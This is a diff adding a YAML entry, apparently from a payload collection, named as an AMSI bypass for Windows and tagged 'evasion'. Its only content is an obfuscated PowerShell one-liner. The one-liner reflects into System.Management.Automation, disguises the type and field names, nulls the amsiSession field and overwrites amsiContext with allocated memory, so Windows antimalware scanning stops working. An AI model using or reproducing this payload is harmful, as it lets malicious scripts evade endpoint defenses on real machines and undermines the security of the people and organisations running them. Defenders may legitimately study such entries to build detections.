@@ -1,0 +1,9 @@
+---
+metadata:
+  filename: "amsi-bypass-windows-forceerror.yaml"
+  tags: ["windows", "evasion"]
+  created: "2026-05-27"
+  authors: ["@s3mme", "@TIVKU", "https://amsi.fail/"]
+
+content: |
+  $Eq5Hk1=[APPDOMaiN]::CurREnTDOmAin.getASSeMBlIEs()|wHere-Object{$_.loCATion -AnD $_.LOcatiON.eNdSwith('System.Management.Automation.dll')};[VOId](gET-vARIAbLe -namE 'On4ET' -eRrORACtIoN SilENtlYcontINUe);$IBMjg7niAJ1Z=[SYSteM.refLECtIon.BINDIngFLAgs]'NonPublic,Static';$k7UJO1=$eq5Hk1.gETTyPEs()|whErE-oBJect{$_.nAME -Eq $(([SYSTem.TeXT.EnCODinG]::AsCiI.gETstRiNG([bYtE[]]((65*51/51),(0X3018 -bXoR 0x3075),((115)),(43+62),(79+6),(0x3bb0 -BXOr 0X3bC4),(94+11),(108+29-29),(31+84)))))};[SyStEM.tHReading.THrEAd]::slEEP(411);$fRXgRx=[SYSteM.ruNTIme.InteroPsERvICes.MArshAl]::AlLoCHGlobaL((4456+4620));[sYsteM.rUntIme.InteROPSERVICeS.mARShAL]::COpy([BytE[]]::NEW((4124+4952)),0,$FrxGrX,(9076*5874/5874));[vOiD](gET-VARIable -nAme 'kHhMLeIOK' -errorACTIoN SilentLYcOntiNuE);$K7UjO1.geTFieLd($(('{0}{1}{2}' -f 'amsiSes','si','on')),$iBmJG7niaj1z).SeTValUe($NulL,$nuLl);$K7UJO1.GetFielD($(('{0}{1}' -f 'amsiC','ontext')),$iBMJg7niAJ1z).seTvAlUe($NUll,[intpTR]$FRXgRX)
